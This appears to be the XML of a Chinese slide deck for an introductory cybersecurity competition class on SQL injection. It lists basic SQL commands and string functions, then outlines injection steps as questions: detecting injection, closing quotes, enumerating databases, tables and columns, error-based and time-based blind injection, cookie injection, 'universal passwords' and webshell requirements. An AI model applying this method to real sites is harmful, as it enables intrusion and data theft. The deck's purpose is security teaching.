            <a:ext cx="76943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sql</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>笔记：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>show databases; //</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>查看库</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>show tables; //</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>查看表</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>库名</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>;	//</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>使用某个库</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>database() schema()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>select * from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>表名</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>;	//</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>查询表里所有列	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select username from users;		//</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>查询</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>username</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>这一列</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>limit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>条件 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>where</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>条件 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>and or (order by)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>union </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>两种注释</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>database()	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>字符串处理函数</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>mid()  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>substr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>() left() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>ord</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>() ascii()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>字符串拼接函数</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>concat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>group_concat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>concat_ws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sql</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>注入：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>hackbar</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>如何判断存在注入？（如何引起报错得到后台预设的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>sql</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>语句？）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>如何闭合符号？</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>编码</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>判断字段数？判断库名？判断表名？判断字段名？</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>判断报错点？注出数据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7367" y="9144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16250" y="1120139"/>
            <a:ext cx="100934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  <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>报错函数？延时盲注</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>GET</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>和</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>POST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>的区别？</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>(BURP)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>万能密码？</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>注入</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>//</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>写马要求？</a:t>
            </a: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University of Malaya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9844"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="E82209"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="FCC300"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="0B52A2"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="0D8ECC"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="ABDBDF"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="4472C4"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="BFBFBF"/>
      </a:folHlink>
    </a:clrScheme>
    <a:fontScheme name="tdl3kz1d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3845</Words>
  <Application>WPS 演示</Application>
  <PresentationFormat>宽屏</PresentationFormat>
  <Paragraphs>247</Paragraphs>
  <Slides>19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华光中圆_CNKI</vt:lpstr>
      <vt:lpstr>黑体</vt:lpstr>
      <vt:lpstr>-apple-system</vt:lpstr>
      <vt:lpstr>Menlo</vt:lpstr>
      <vt:lpstr>Segoe Print</vt:lpstr>
      <vt:lpstr>PingFang SC</vt:lpstr>
      <vt:lpstr>微软雅黑</vt:lpstr>
      <vt:lpstr>Arial Unicode MS</vt:lpstr>
      <vt:lpstr>等线</vt:lpstr>
      <vt:lpstr>webwppDefTheme</vt:lpstr>
      <vt:lpstr>主题5</vt:lpstr>
      <vt:lpstr>网络空间安全竞赛体验课-SQL注入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主标题</dc:title>
  <dc:creator>Hansen</dc:creator>
  <cp:lastModifiedBy>陈慧珍</cp:lastModifiedBy>
  <cp:revision>46</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2020-11-19T00:54:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-10T01:09:35Z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KSOProductBuildVer">
    <vt:lpwstr>2052-12.1.0.25225</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="4" name="ICV">
    <vt:lpwstr>849FB04837374DD9AE516CC38C79AB77</vt:lpwstr>
  </property>
</Properties>
</file>